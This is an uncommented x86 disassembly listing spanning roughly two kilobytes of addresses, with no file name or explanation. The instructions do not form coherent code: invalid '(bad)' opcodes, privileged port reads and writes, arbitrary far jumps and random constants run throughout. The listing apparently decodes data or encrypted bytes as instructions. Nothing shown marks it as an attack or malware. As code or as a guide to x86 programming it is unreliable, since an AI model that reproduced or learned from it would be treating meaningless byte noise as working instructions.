  41f891:	cmp    eax,ecx
  41f893:	enter  0xaef7,0x87
  41f897:	dec    edi
  41f898:	xchg   ebx,eax
  41f899:	ja     0x41f88c
  41f89b:	clc    
  41f89c:	ins    DWORD PTR es:[edi],dx
  41f89d:	sub    eax,0x22425bf8
  41f8a2:	in     eax,0xe7
  41f8a4:	dec    edi
  41f8a5:	xor    eax,0xa45f0852
  41f8aa:	dec    ecx
  41f8ab:	aas    
  41f8ac:	rcl    BYTE PTR [ecx-0x5c],1
  41f8af:	sbb    eax,DWORD PTR ss:[ecx+0x69e334ab]
  41f8b6:	push   0x57
  41f8b8:	jp     0x41f860
  41f8ba:	mov    bh,0x29
  41f8bc:	push   ebp
  41f8bd:	popf   
  41f8be:	xor    ecx,DWORD PTR [eax-0xd09bbde]
  41f8c4:	dec    esp
  41f8c5:	cmp    BYTE PTR [eax-0x77],0x5c
  41f8c9:	dec    edi
  41f8ca:	(bad)  [ecx]
  41f8cc:	mov    eax,DWORD PTR [ebp-0x1d8952a]
  41f8d2:	out    0xd5,eax
  41f8d4:	add    eax,0xba182af5
  41f8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8da:	jp     0x41f890
  41f8dc:	push   edx
  41f8dd:	xor    DWORD PTR [eax-0x26662427],ecx
  41f8e3:	inc    ecx
  41f8e4:	xchg   ecx,eax
  41f8e5:	fcmovbe st,st(4)
  41f8e7:	or     edi,ecx
  41f8e9:	jo     0x41f8ee
  41f8eb:	int    0x12
  41f8ed:	and    dl,BYTE PTR ds:0xc20a765
  41f8f3:	xor    DWORD PTR [eax],esi
  41f8f5:	jmp    0x7743:0x5a7bffd9
  41f8fc:	or     al,0x70
  41f8fe:	sbb    bl,BYTE PTR [eax+0x54f9f6a5]
  41f904:	outs   dx,DWORD PTR ds:[esi]
  41f905:	call   0x40ccd418
  41f90a:	fild   QWORD PTR [ecx+ecx*2-0x6dffbc94]
  41f911:	push   edi
  41f912:	sahf   
  41f913:	sub    al,0x91
  41f915:	inc    bh
  41f917:	adc    bh,BYTE PTR [ebp-0x44d9d60d]
  41f91d:	stos   BYTE PTR es:[edi],al
  41f91e:	cmp    eax,0xe4144d7d
  41f923:	aas    
  41f924:	mov    edi,0x7ba6ad65
  41f929:	ins    BYTE PTR es:[edi],dx
  41f92a:	lods   al,BYTE PTR ds:[esi]
  41f92b:	push   edx
  41f92c:	push   esi
  41f92d:	enter  0x9146,0xe6
  41f931:	xchg   esp,eax
  41f932:	icebp  
  41f933:	add    BYTE PTR [esi],0x7d
  41f936:	data16 aad 0xf3
  41f939:	and    ah,al
  41f93b:	pop    ecx
  41f93c:	or     eax,0x8e34e835
  41f941:	aam    0x3d
  41f943:	mov    ebp,0x6aa3319d
  41f948:	jle    0x41f995
  41f94a:	mov    ebx,0xad62f629
  41f94f:	imul   ebp,DWORD PTR ss:[ecx-0x28903737]
  41f957:	icebp  
  41f958:	in     al,dx
  41f959:	outs   dx,BYTE PTR ds:[esi]
  41f95a:	xchg   ecx,eax
  41f95b:	jecxz  0x41f936
  41f95d:	and    DWORD PTR ds:0x31327a3f,eax
  41f963:	pop    esp
  41f964:	fsubr  DWORD PTR [ecx]
  41f966:	cmc    
  41f967:	jmp    0x8df8:0x1b212906
  41f96e:	jle    0x41f959
  41f970:	inc    ecx
  41f971:	jo     0x41f919
  41f973:	lea    edx,[esi+0x6e463c35]
  41f979:	add    DWORD PTR [ecx],esp
  41f97b:	jmp    0x64e6:0x55425e8b
  41f982:	fisubr DWORD PTR [ecx+0x27069095]
  41f988:	sti    
  41f989:	pop    ebx
  41f98a:	popf   
  41f98b:	xchg   BYTE PTR [edx-0x5fbe1e70],bh
  41f991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f992:	and    al,0x81
  41f994:	cli    
  41f995:	mov    edi,0xbd7a6638
  41f99a:	(bad)
  41f99e:	aad    0xee
  41f9a0:	pop    eax
  41f9a1:	fiadd  WORD PTR [eax-0x3f]
  41f9a4:	cmp    DWORD PTR [ebx+edi*2-0x83f825e],ebp
  41f9ab:	rcl    DWORD PTR [ebp-0x3f5b5400],0xea
  41f9b2:	xchg   ecx,eax
  41f9b3:	pop    esi
  41f9b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9b5:	sub    al,0x21
  41f9b7:	lea    ebp,[ebp+0x56]
  41f9ba:	imul   eax,DWORD PTR [edx],0xa4edc0c4
  41f9c0:	jo     0x41f946
  41f9c2:	push   0xb1a7087c
  41f9c7:	xor    al,0xf
  41f9c9:	loopne 0x41f9eb
  41f9cb:	imul   eax,esp,0x796f577c
  41f9d1:	adc    eax,0x4e873a6
  41f9d6:	(bad)  
  41f9d9:	pand   mm4,QWORD PTR [eax]
  41f9dc:	mov    bh,0xbd
  41f9de:	ror    dh,1
  41f9e0:	mov    dl,0x55
  41f9e2:	and    al,BYTE PTR [edx+0x10]
  41f9e5:	pushf  
  41f9e6:	inc    esi
  41f9e7:	and    eax,0x36e42c00
  41f9ec:	popf   
  41f9ed:	add    al,0x54
  41f9ef:	mov    esp,0x8e09a71b
  41f9f4:	jne    0x41fa0d
  41f9f6:	mov    esp,0x5a49778d
  41f9fb:	and    ebp,ebp
  41f9fd:	xchg   edi,eax
  41f9fe:	outs   dx,BYTE PTR ds:[esi]
  41f9ff:	into   
  41fa00:	jge    0x41fa72
  41fa02:	test   eax,0x63c6daa5
  41fa07:	pop    esp
  41fa08:	cwde   
  41fa09:	cmp    al,0xbf
  41fa0b:	enter  0x1ddc,0x48
  41fa0f:	js     0x41f9dc
  41fa11:	retf   0x7c9b
  41fa14:	rcl    BYTE PTR [eax],1
  41fa16:	adc    eax,0x77242b33
  41fa1b:	mov    edx,DWORD PTR [edi]
  41fa1d:	nop
  41fa1e:	xor    BYTE PTR [eax],dl
  41fa20:	mov    gs,WORD PTR [ecx-0x5fe332d7]
  41fa26:	and    BYTE PTR [ebp-0x453b9631],dh
  41fa2c:	or     eax,0xd20c48ce
  41fa31:	mov    dh,0x43
  41fa33:	ins    BYTE PTR es:[edi],dx
  41fa34:	xchg   ecx,eax
  41fa35:	pop    esi
  41fa36:	call   0x656b3759
  41fa3b:	and    eax,0x99587079
  41fa40:	push   es
  41fa41:	sub    al,0xbf
  41fa43:	lods   eax,DWORD PTR ds:[esi]
  41fa44:	push   ecx
  41fa45:	jmp    0x58a57f20
  41fa4a:	lds    esi,FWORD PTR ds:0x6d06ca17
  41fa50:	cs jmp 0xdc60d380
  41fa56:	mov    edx,0x5f1e3b8b
  41fa5b:	sbb    BYTE PTR [esi-0x55],dh
  41fa5e:	mov    bl,0xdd
  41fa60:	and    BYTE PTR [ebx-0x16dc40f5],al
  41fa66:	add    esi,DWORD PTR [ecx]
  41fa68:	jbe    0x41fa25
  41fa6a:	xor    BYTE PTR [ebx+0x1513f25e],0x26
  41fa71:	lods   al,BYTE PTR ds:[esi]
  41fa72:	pop    es
  41fa73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa74:	jmp    0x41fa46
  41fa76:	xchg   ecx,eax
  41fa77:	sub    dh,BYTE PTR [esi]
  41fa79:	lods   eax,DWORD PTR ds:[esi]
  41fa7a:	arpl   WORD PTR [eax],bp
  41fa7c:	xchg   esp,eax
  41fa7d:	push   edi
  41fa7e:	xchg   ecx,eax
  41fa7f:	xchg   ecx,eax
  41fa80:	cmp    BYTE PTR [edi+0x1e],bh
  41fa83:	mov    ebp,0x27334892
  41fa88:	mov    edx,0x62370743
  41fa8d:	jnp    0x41fa50
  41fa8f:	mov    dl,BYTE PTR gs:[ebp-0x3b299f]
  41fa96:	call   0xf6c0d30e
  41fa9b:	into   
  41fa9c:	jb     0x41fa1f
  41fa9e:	or     eax,0xf3fd8645
  41faa3:	cmp    al,0xa5
  41faa5:	or     ebx,DWORD PTR [edx+0x1e]
  41faa8:	fdivr  QWORD PTR [ecx]
  41faaa:	das    
  41faab:	xor    BYTE PTR [edx+0x10],al
  41faae:	jmp    0x41fa75
  41fab0:	pop    ecx
  41fab1:	ins    DWORD PTR es:[edi],dx
  41fab2:	push   eax
  41fab3:	(bad)  
  41fab5:	imul   esi,DWORD PTR [eax+esi*8+0x43],0x46
  41faba:	pusha  
  41fabb:	dec    edx
  41fabc:	and    DWORD PTR [ebx+0x2],edi
  41fabf:	push   es
  41fac0:	fsub   st,st(3)
  41fac2:	dec    ecx
  41fac3:	pop    ebp
  41fac4:	repnz dec ebx
  41fac6:	push   0x7481ccfc
  41facb:	das    
  41facc:	and    ebx,DWORD PTR [edi-0x21433a6c]
  41fad2:	adc    eax,esp
  41fad4:	not    DWORD PTR [ebx+0x44]
  41fad7:	enter  0x559d,0x71
  41fadb:	les    esp,FWORD PTR [eax-0x1e]
  41fade:	mov    ebx,DWORD PTR [edx+0x72a575b8]
  41fae4:	inc    ecx
  41fae5:	js     0x41fa8a
  41fae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fae8:	fld    QWORD PTR [eax+0x5402d5de]
  41faee:	icebp  
  41faef:	sar    DWORD PTR [edx-0x22],1
  41faf2:	add    DWORD PTR [ebp-0x4a7ce261],esi
  41faf8:	shl    DWORD PTR [edi],1
  41fafa:	cmp    dh,BYTE PTR [edx+0x12]
  41fafd:	and    al,0xbe
  41faff:	sar    BYTE PTR [ecx],0xa
  41fb02:	js     0x41fb58
  41fb04:	and    eax,0x7dcf395c
  41fb09:	push   es
  41fb0a:	test   ebx,esp
  41fb0c:	and    al,0xb2
  41fb0e:	sbb    al,0x1f
  41fb10:	sbb    ebx,edi
  41fb12:	adc    BYTE PTR [eax],al
  41fb14:	mov    bl,0xa8
  41fb16:	or     cl,BYTE PTR gs:[eax+0x52]
  41fb1a:	xchg   ebx,eax
  41fb1b:	xor    ch,BYTE PTR [ebp-0x4d]
  41fb1e:	jnp    0x41faf1
  41fb20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb21:	sbb    al,0x7e
  41fb23:	test   ch,cl
  41fb25:	mov    al,ds:0xe19f36f4
  41fb2a:	nop
  41fb2b:	xchg   edi,eax
  41fb2c:	aad    0x83
  41fb2e:	or     ah,bh
  41fb30:	mov    BYTE PTR [ebx+0x1bca87d8],ch
  41fb36:	jmp    DWORD PTR [ebp-0x30]
  41fb39:	mov    ecx,0x67881ba3
  41fb3e:	add    ecx,esp
  41fb40:	es jae 0x41fb24
  41fb43:	test   BYTE PTR [edx],dh
  41fb45:	dec    ecx
  41fb46:	mov    esp,0x6af5ccc5
  41fb4b:	and    DWORD PTR [edi+0x48],ebp
  41fb4e:	xor    al,0xd6
  41fb50:	aaa    
  41fb51:	ds push esp
  41fb53:	dec    ebx
  41fb54:	jmp    DWORD PTR [ebx]
  41fb56:	pop    esp
  41fb57:	aaa    
  41fb58:	adc    DWORD PTR [edi+0x76],0x5aca1c02
  41fb5f:	sub    BYTE PTR [esi+0x6],bh
  41fb62:	push   ebx
  41fb63:	dec    ecx
  41fb64:	dec    ecx
  41fb65:	push   0x70
  41fb67:	dec    bl
  41fb69:	nop
  41fb6a:	sbb    eax,0x8abae211
  41fb6f:	push   ss
  41fb70:	cld    
  41fb71:	mov    bl,0xc7
  41fb73:	mov    bl,dl
  41fb75:	neg    BYTE PTR [ebp+0x3561ffb5]
  41fb7b:	or     al,0x12
  41fb7d:	inc    edx
  41fb7e:	inc    eax
  41fb7f:	inc    eax
  41fb80:	nop
  41fb81:	shl    edi,1
  41fb83:	jl     0x41fb8d
  41fb85:	push   0x5b20ae0d
  41fb8a:	xor    ch,BYTE PTR [esi+0xc]
  41fb8d:	ins    BYTE PTR es:[edi],dx
  41fb8e:	fnstenv [esi]
  41fb90:	mov    ebp,0x453d4a40
  41fb95:	call   0x178b626
  41fb9a:	dec    esp
  41fb9b:	out    dx,eax
  41fb9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb9d:	fucom  st(7)
  41fb9f:	sub    eax,0x39be30c2
  41fba4:	data16 fstp TBYTE PTR es:[esp+ebp*4]
  41fba9:	in     eax,0x51
  41fbab:	les    ebp,FWORD PTR [ebx]
  41fbad:	mov    bh,0x11
  41fbaf:	loope  0x41fb4b
  41fbb1:	pop    ss
  41fbb2:	sub    ecx,ebp
  41fbb4:	inc    edx
  41fbb5:	dec    esi
  41fbb6:	cwde   
  41fbb7:	pop    edi
  41fbb8:	stos   BYTE PTR es:[edi],al
  41fbb9:	mov    cl,0xcc
  41fbbb:	aaa    
  41fbbc:	dec    edx
  41fbbd:	fisubr WORD PTR [ecx+0x4050066f]
  41fbc3:	daa    
  41fbc4:	or     ch,dl
  41fbc6:	mov    cl,0x5c
  41fbc8:	call   0x42c8:0x55d5a396
  41fbcf:	rcl    DWORD PTR [eax+0x50],cl
  41fbd2:	xchg   esi,eax
  41fbd3:	inc    ebx
  41fbd4:	jne    0x41fc50
  41fbd6:	inc    edi
  41fbd7:	adc    DWORD PTR [ecx-0x2c1fdc24],edi
  41fbdd:	out    dx,eax
  41fbde:	outs   dx,DWORD PTR ds:[esi]
  41fbdf:	mov    dl,0x0
  41fbe1:	mov    dl,0xca
  41fbe3:	xchg   ecx,eax
  41fbe4:	xor    DWORD PTR [edi],0xff789dca
  41fbea:	leave  
  41fbeb:	outs   dx,BYTE PTR ds:[esi]
  41fbec:	mov    ch,0x25
  41fbee:	lods   eax,DWORD PTR ds:[esi]
  41fbef:	iret   
  41fbf0:	push   eax
  41fbf1:	jne    0x41fb8b
  41fbf3:	call   0xa519b658
  41fbf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbf9:	stc    
  41fbfa:	mov    edi,0x50a34022
  41fbff:	add    cl,0x61
  41fc02:	and    eax,DWORD PTR [eax+0x2e]
  41fc05:	push   0x2a
  41fc07:	retf   
  41fc08:	adc    DWORD PTR [esi+0x1338c32d],esp
  41fc0e:	int    0x26
  41fc10:	pusha  
  41fc11:	mov    ch,0xcf
  41fc13:	pop    esi
  41fc14:	aam    0xce
  41fc16:	ins    DWORD PTR es:[edi],dx
  41fc17:	adc    eax,esp
  41fc19:	or     eax,DWORD PTR [ecx+0x31]
  41fc1c:	mov    ah,0xf5
  41fc1e:	cmp    al,0x3f
  41fc20:	(bad)
  41fc25:	xchg   esp,eax
  41fc26:	leave  
  41fc27:	out    dx,eax
  41fc28:	test   BYTE PTR [edi+0x19],bh
  41fc2b:	xchg   edx,eax
  41fc2c:	xor    DWORD PTR cs:[ecx+eiz*4+0x753c9b38],ebp
  41fc34:	mov    edi,0xc7372a5e
  41fc39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc3a:	fs push ebp
  41fc3c:	jle    0x41fbf5
  41fc3e:	mov    bh,0xb4
  41fc40:	mov    eax,ds:0x35f1df13
  41fc45:	mov    bh,0x95
  41fc47:	push   edi
  41fc48:	push   ecx
  41fc49:	loopne 0x41fc45
  41fc4b:	push   ebp
  41fc4c:	xchg   si,ax
  41fc4e:	push   es
  41fc4f:	shr    BYTE PTR [eax-0x554e91ac],1
  41fc55:	mov    eax,0x60f43115
  41fc5a:	inc    esi
  41fc5b:	xchg   esi,eax
  41fc5c:	loop   0x41fc65
  41fc5e:	in     eax,dx
  41fc5f:	cmp    DWORD PTR [ebp-0x69df573e],esp
  41fc65:	lods   eax,DWORD PTR ds:[esi]
  41fc66:	inc    esp
  41fc67:	xor    al,bh
  41fc69:	dec    esi
  41fc6a:	call   0x1cad7ed0
  41fc6f:	scas   al,BYTE PTR es:[edi]
  41fc70:	or     eax,0xbf7c3b8a
  41fc75:	sti    
  41fc76:	inc    esp
  41fc77:	lahf   
  41fc78:	pusha  
  41fc79:	notrack call DWORD PTR [eax-0x9]
  41fc7d:	push   esi
  41fc7e:	les    ecx,FWORD PTR [eax+esi*1-0x73]
  41fc82:	jns    0x41fce3
  41fc84:	pop    edx
  41fc85:	std    
  41fc86:	mov    edx,0xfbcb28a1
  41fc8b:	or     ah,BYTE PTR ds:0x9da2f7d2
  41fc91:	inc    ecx
  41fc92:	and    edx,DWORD PTR [edi+0x7e]
  41fc95:	ja     0x41fcb6
  41fc97:	or     al,0xce
  41fc99:	push   ds
  41fc9a:	xor    eax,0x756b1c9e
  41fc9f:	xor    eax,0x91ae7c7b
  41fca4:	cmp    DWORD PTR [ebx-0x960bd94],esi
  41fcaa:	jno    0x41fd29
  41fcac:	add    BYTE PTR [esi+0x4d387087],ah
  41fcb2:	shl    BYTE PTR [eax],1
  41fcb4:	idiv   DWORD PTR [ecx+0x643d45f3]
  41fcba:	cld    
  41fcbb:	addr16 loope 0x41fc60
  41fcbe:	jl     0x41fc79
  41fcc0:	sub    edx,ebp
  41fcc2:	mov    ebp,0x7171940b
  41fcc7:	push   edx
  41fcc8:	shl    bl,1
  41fcca:	dec    edx
  41fccb:	xchg   ecx,eax
  41fccc:	(bad)  
  41fccd:	retf   0xf4f3
  41fcd0:	xor    al,0x6f
  41fcd2:	std    
  41fcd3:	dec    ecx
  41fcd4:	jecxz  0x41fca4
  41fcd6:	lahf   
  41fcd7:	mov    ah,0xcf
  41fcd9:	ja     0x41fd1a
  41fcdb:	shr    DWORD PTR [ecx],cl
  41fcdd:	ja     0x41fc71
  41fcdf:	dec    ecx
  41fce0:	arpl   WORD PTR [esi-0x28d18686],di
  41fce6:	push   esp
  41fce7:	int3   
  41fce8:	mov    eax,0x59b515c6
  41fced:	lahf   
  41fcee:	push   es
  41fcef:	repnz or dh,BYTE PTR [eax+ecx*8]
  41fcf3:	fiadd  WORD PTR [edi+0x49]
  41fcf6:	aas    
  41fcf7:	lds    esi,FWORD PTR [ecx]
  41fcf9:	or     bl,BYTE PTR [esi-0x51]
  41fcfc:	(bad)  
  41fcfd:	(bad)  
  41fcfe:	std    
  41fcff:	pop    esp
  41fd00:	and    ebx,DWORD PTR [ebp-0x31f229c]
  41fd06:	mov    dh,0xea
  41fd08:	out    dx,al
  41fd09:	ficom  DWORD PTR [ebx]
  41fd0b:	xchg   esi,eax
  41fd0c:	jge    0x41fccc
  41fd0e:	cdq    
  41fd0f:	xchg   DWORD PTR [eax+0x69],ebx
  41fd12:	sub    eax,0xbcecfebe
  41fd17:	xlat   BYTE PTR ds:[ebx]
  41fd18:	jl     0x41fcfa
  41fd1a:	ss mov esi,0x8ed55664
  41fd20:	clc    
  41fd21:	push   edx
  41fd22:	inc    edx
  41fd23:	mov    edx,0x579167
  41fd28:	add    esi,DWORD PTR [ebx-0x32]
  41fd2b:	pop    edi
  41fd2c:	(bad)  
  41fd2d:	adc    eax,0x2a47dde9
  41fd32:	loop   0x41fd5e
  41fd34:	xchg   esp,eax
  41fd35:	inc    ebx
  41fd36:	jns    0x41fd70
  41fd38:	adc    al,0x2f
  41fd3a:	addr16 sbb bl,dh
  41fd3d:	fistp  QWORD PTR [eax+0x1d34ebc3]
  41fd43:	mov    esi,0xdb69c4f1
  41fd49:	mov    WORD PTR [ebx-0x73],fs
  41fd4c:	imul   eax,DWORD PTR [esi+edi*4],0xffffff87
  41fd50:	clc    
  41fd51:	pop    edi
  41fd52:	jo     0x41fd4c
  41fd54:	repz xor dh,ch
  41fd57:	mov    edx,0x2fb22f64
  41fd5c:	cld    
  41fd5d:	js     0x41fce2
  41fd5f:	retf   
  41fd60:	ss hlt 
  41fd62:	sbb    bl,BYTE PTR [ebx]
  41fd64:	adc    DWORD PTR [ebx+0x3c3c3304],edx
  41fd6a:	pop    ebx
  41fd6b:	push   edi
  41fd6c:	repz and eax,0xb385ab97
  41fd72:	out    dx,eax
  41fd73:	fld    DWORD PTR [ecx-0x419e4d2d]
  41fd79:	cmp    BYTE PTR [eax-0x614013c6],ah
  41fd7f:	sbb    bl,BYTE PTR [ebx+0x39]
  41fd82:	sbb    DWORD PTR [ecx],edx
  41fd84:	sti    
  41fd85:	(bad)  
  41fd86:	out    0x76,eax
  41fd88:	test   al,0x9f
  41fd8a:	ins    BYTE PTR es:[edi],dx
  41fd8b:	int    0x1b
  41fd8d:	xchg   BYTE PTR ds:0xd0582332,bh
  41fd93:	clc    
  41fd94:	call   DWORD PTR [ecx]
  41fd96:	push   ecx
  41fd97:	sub    BYTE PTR [edi+esi*1+0x69],cl
  41fd9b:	outs   dx,BYTE PTR cs:[esi]
  41fd9d:	pop    edx
  41fd9e:	mov    edx,0x52271a29
  41fda3:	aam    0xe1
  41fda5:	bound  esp,QWORD PTR [edi]
  41fda7:	inc    ebx
  41fda8:	(bad)  
  41fda9:	fdivr  DWORD PTR [ebx-0x72]
  41fdac:	stos   BYTE PTR es:[edi],al
  41fdad:	cmp    bh,BYTE PTR [esi+edx*2+0x4f]
  41fdb1:	lea    esi,[esi-0x36ed4ea4]
  41fdb7:	into   
  41fdb8:	ss push si
  41fdbb:	cmp    al,BYTE PTR [edx+ecx*4+0x21]
  41fdbf:	and    BYTE PTR [edx+edx*2-0x10],al
  41fdc3:	lods   al,BYTE PTR ds:[esi]
  41fdc4:	test   BYTE PTR [edx],bl
  41fdc6:	int    0x3a
  41fdc8:	mov    bh,0x2e
  41fdca:	xchg   edi,eax
  41fdcb:	loopne 0x41fe1f
  41fdcd:	cmp    bl,BYTE PTR [ebp-0x5b87f6fd]
  41fdd3:	(bad)  
  41fdd4:	repnz mov ch,0x8a
  41fdd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdd8:	loop   0x41fdcf
  41fdda:	fcomip st,st(2)
  41fddc:	inc    ecx
  41fddd:	pop    es
  41fdde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fddf:	fist   WORD PTR [ecx-0x22]
  41fde2:	jno    0x41fd9c
  41fde4:	lds    edi,FWORD PTR [edi]
  41fde6:	mov    esi,0x97251ef3
  41fdeb:	loopne 0x41fe0f
  41fded:	int    0x73
  41fdef:	mov    ecx,0x28012330
  41fdf4:	mov    dh,0x8c
  41fdf6:	imul   esp,DWORD PTR [ebx+0x8435ca8],0xaf5d042d
  41fe00:	aad    0xfb
  41fe02:	mov    dl,0xbf
  41fe04:	push   ecx
  41fe05:	jg     0x41fdbc
  41fe07:	add    al,0x4e
  41fe09:	cmc    
  41fe0a:	nop
  41fe0b:	test   DWORD PTR [edi+eiz*4-0x77],ebx
  41fe0f:	sbb    eax,0xf2bc25d
  41fe14:	ds addr16 jge 0xd959da75
  41fe1c:	pushf  
  41fe1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe1e:	xchg   ebp,eax
  41fe1f:	mov    ah,0x7
  41fe21:	push   ebx
  41fe22:	nop
  41fe23:	add    DWORD PTR [ecx+0x5b636066],esi
  41fe29:	retf   
  41fe2a:	jecxz  0x41fe2c
  41fe2c:	sahf   
  41fe2d:	repnz pop esp
  41fe2f:	das    
  41fe30:	mov    WORD PTR [eax],es
  41fe32:	out    0x98,eax
  41fe34:	cwde   
  41fe35:	mov    bl,0x94
  41fe37:	mov    ds:0x6d56c752,eax
  41fe3c:	sbb    DWORD PTR [ecx+eiz*8+0x12],0x56
  41fe41:	push   es
  41fe42:	fmul   QWORD PTR [edi+0x7a0e8495]
  41fe48:	popa   
  41fe49:	dec    ebx
  41fe4a:	sub    bl,bl
  41fe4c:	mov    BYTE PTR [ebx+ebp*8-0x47],ch
  41fe50:	ds out dx,al
  41fe52:	jmp    0xe40384e5
  41fe57:	fidivr WORD PTR [ebx-0x195cdd9e]
  41fe5d:	stos   BYTE PTR es:[edi],al
  41fe5e:	xor    eax,0x384b0159
  41fe63:	xchg   edx,eax
  41fe64:	or     ebp,ebp
  41fe66:	mov    ch,0x29
  41fe68:	jg     0x41fed7
  41fe6a:	cdq    
  41fe6b:	sbb    esp,ecx
  41fe6d:	rol    BYTE PTR [ebx+0x4f],cl
  41fe70:	mov    esp,0x23f337cc
  41fe75:	inc    edi
  41fe76:	cmp    eax,0x909ffae4
  41fe7b:	(bad)  
  41fe7c:	retf   0x30e4
  41fe7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe80:	cdq    
  41fe81:	int3   
  41fe82:	fisttp QWORD PTR [ebx]
  41fe84:	dec    esp
  41fe85:	dec    esi
  41fe86:	inc    edi
  41fe87:	cwde   
  41fe88:	lea    eax,[edx+0x27]
  41fe8b:	pop    es
  41fe8c:	pop    ebp
  41fe8d:	lods   al,BYTE PTR ds:[esi]
  41fe8e:	popf   
  41fe8f:	and    ch,al
  41fe91:	pop    ebx
  41fe92:	mov    eax,0xe5c526eb
  41fe97:	mov    dh,0xca
  41fe99:	dec    edi
  41fe9a:	nop
  41fe9b:	and    DWORD PTR [ebp+0x38],ebx
  41fe9e:	or     BYTE PTR [esi+0x8],cl
  41fea1:	test   BYTE PTR [esi+0x50],al
  41fea4:	stos   DWORD PTR es:[edi],eax
  41fea5:	jle    0x41feb8
  41fea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fea8:	xor    dh,BYTE PTR [esi-0x26]
  41feab:	adc    eax,DWORD PTR [ebp+ebp*8-0x16e2ad8f]
  41feb2:	gs xor esp,ebp
  41feb5:	ins    BYTE PTR es:[edi],dx
  41feb6:	cwde   
  41feb7:	cs daa 
  41feb9:	test   DWORD PTR [ecx+0x600e3603],edx
  41febf:	pop    ebp
  41fec0:	fcom   DWORD PTR [eax+0x61]
  41fec3:	add    ebp,DWORD PTR [ebx]
  41fec5:	les    ebx,FWORD PTR [esi-0xc]
  41fec8:	mov    ebp,0x34e4270
  41fecd:	cld    
  41fece:	mov    edi,0xe27c7f4c
  41fed3:	das    
  41fed4:	xchg   ebx,eax
  41fed5:	xchg   edi,eax
  41fed6:	jmp    0x25f2c142
  41fedb:	icebp  
  41fedc:	push   ss
  41fedd:	dec    ebx
  41fede:	cdq    
  41fedf:	pushf  
  41fee0:	sahf   
  41fee1:	(bad)  
  41fee2:	xor    al,0x13
  41fee4:	or     eax,0x2ebac47d
  41fee9:	jns    0x41feb0
  41feeb:	xchg   ebx,eax
  41feec:	mov    cl,0xc4
  41feee:	loopne 0x41ff5c
  41fef0:	stos   BYTE PTR es:[edi],al
  41fef1:	aas    
  41fef2:	sub    ecx,DWORD PTR [esi]
  41fef4:	call   0x3f1b:0x571e455b
  41fefb:	xor    ecx,edx
  41fefd:	imul   edx,DWORD PTR [edi+0x7c90ee9f],0x8e556fef
  41ff07:	mov    ds:0x9eb16802,al
  41ff0c:	je     0x41ff7d
  41ff0e:	xor    al,0x8d
  41ff10:	div    DWORD PTR [edi+0x5d]
  41ff13:	lods   al,BYTE PTR ds:[esi]
  41ff14:	and    al,0x28
  41ff16:	jnp    0x41ff0f
  41ff18:	pop    edi
  41ff19:	sar    BYTE PTR [esi-0x3d372f52],cl
  41ff1f:	mov    dh,0x2d
  41ff21:	lock mov ds:0xa8eeff4f,eax
  41ff27:	jmp    0x41ff63
  41ff29:	mov    edx,0xbfc02024
  41ff2e:	into   
  41ff2f:	stos   BYTE PTR es:[edi],al
  41ff30:	mov    ch,bl
  41ff32:	jp     0x41ffa6
  41ff34:	push   ss
  41ff35:	sbb    dh,BYTE PTR [esp+ebp*1]
  41ff38:	jnp    0x41fefe
  41ff3a:	shl    BYTE PTR [eax-0x48],cl
  41ff3d:	(bad)  
  41ff3f:	shr    cl,cl
  41ff41:	cmp    BYTE PTR ds:[esi-0x65],ah
  41ff45:	pop    ecx
  41ff46:	xchg   esp,eax
  41ff47:	add    BYTE PTR [ebx+0x37],ch
  41ff4a:	fsubr  DWORD PTR [esi]
  41ff4c:	xor    ebx,edx
  41ff4e:	adc    al,0xb0
  41ff50:	aaa    
  41ff51:	inc    eax
  41ff52:	cmp    DWORD PTR [edi],eax
  41ff54:	add    esi,DWORD PTR [esi]
  41ff56:	mov    ah,0xd
  41ff58:	adc    ah,BYTE PTR [ebx]
  41ff5a:	jnp    0x41ffc4
  41ff5c:	push   edi
  41ff5d:	cmp    dh,BYTE PTR [ecx-0x32]
  41ff60:	rol    DWORD PTR [edi+0x45],0xfd
  41ff64:	inc    ebx
  41ff65:	mov    eax,ds:0x8c35caa8
  41ff6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff6b:	sub    eax,0xa1b56c91
  41ff70:	jp     0x41ff0e
  41ff72:	jmp    0xfb160442
  41ff77:	ficomp DWORD PTR [ebp-0x4d]
  41ff7a:	mov    al,ds:0x5811100a
  41ff7f:	ins    DWORD PTR es:[edi],dx
  41ff80:	jno    0x41ff2c
  41ff82:	xchg   BYTE PTR [edx],ch
  41ff84:	in     eax,0xa
  41ff86:	lahf   
  41ff87:	test   DWORD PTR [esi],edx
  41ff89:	(bad)  
  41ff8a:	pop    ebx
  41ff8b:	cmovnp edx,DWORD PTR [esi-0x53d632ff]
  41ff92:	sub    bh,bh
  41ff94:	inc    esp
  41ff95:	mov    dl,0x64
  41ff97:	icebp  
  41ff98:	push   esp
  41ff99:	push   edi
  41ff9a:	cmp    al,0xf1
  41ff9c:	sbb    eax,0x8fd1ba37
  41ffa1:	xor    edx,eax
  41ffa3:	je     0x41ff67
  41ffa5:	retf   0xe099
  41ffa8:	std    
  41ffa9:	xchg   ebx,eax
  41ffaa:	cmp    eax,0x84bb2f78
  41ffaf:	jmp    0xde685e5
  41ffb4:	into   
  41ffb5:	in     eax,dx
  41ffb6:	jbe    0x41ff5d
  41ffb8:	outs   dx,DWORD PTR ds:[esi]
  41ffb9:	dec    ecx
  41ffba:	mov    cl,0xdf
  41ffbc:	cld    
  41ffbd:	or     al,0xe2
  41ffbf:	lods   al,BYTE PTR ds:[esi]
  41ffc0:	popa   
  41ffc1:	fwait
  41ffc2:	push   esi
  41ffc3:	pop    edx
  41ffc4:	sub    al,0x89
  41ffc6:	adc    DWORD PTR [esi-0x6074f06d],edx
  41ffcc:	and    al,0x1e
